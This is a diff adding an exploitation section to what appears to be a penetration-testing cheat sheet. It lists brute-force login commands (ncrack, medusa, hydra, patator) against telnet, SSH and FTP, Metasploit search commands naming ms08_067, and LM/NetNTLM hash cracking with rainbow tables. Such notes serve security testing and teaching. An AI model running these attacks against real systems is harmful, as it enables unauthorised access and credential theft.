@@ -125,3 +125,30 @@ View > Connections // Ettercap filters credentials submitted in Mitm
 $ sudo nano /etc/ettercap/etter.conf // set uid and gid to 0
 // Additionally, uncomment appropriate redir_command_on/off (in my case, iptables)
 ```
+#### 1.3 Exploitation  
+_1.2.1 Cracking Service Authentication_  
+```
+$ ncrack -vv -U usernames.txt -P passwords.txt targetIP -p telnet // Run Ncrack in verbose mode using a usernames and password file against the Telnet protocol
+$ medusa -h targetIP -M ssh -U usernames.txt -P passwords.txt // Run Medusa using usernames and passwords lists against the SSH service, offers more protocols than ncrack
+$ hydra -L usernames.txt -P passwords.txt ftp://targetIP // Run Hydra with usernames and password file against FTP, fast
+$ patator ftp_login host=FILE0 user=FILE1 password=FILE2 0=hostslist.txt 1=usernames.txt 2=passwords.txt -x ignore:mesg=”Login incorrect.” // Patator offers more modules and protocol support, and highly customizable. Man page at $vim /usr/bin/patator
+```
+_1.2.2 Metasploit Framework_  
+```
+$ sudo msfupdate
+$ sudo service postgresql start
+$ msf> search type:exploit platform:windows or search cve:2015
+$ msf> grep vnc search type:exploit
+$ info windows/smb/ms08_067_netapi // gives information and description about the module
+```
+```
+Meterpreter session 1 opened!
+
+```
+```
+Crack collected LM/NT hashes w/ Rainbow Tables
+$ sudo rcracki_mt -h <first 8bits (16chars) of LM hash> -t 4 *.rti // uses a folder of rainbow tables to extract plaintext of first 8 bytes
+
+$ locate netntlm
+$ sudo perl netntlm.pl --file <netntlm hashes file> --seed <discovered plaintext from first 8 bytes> 
+```
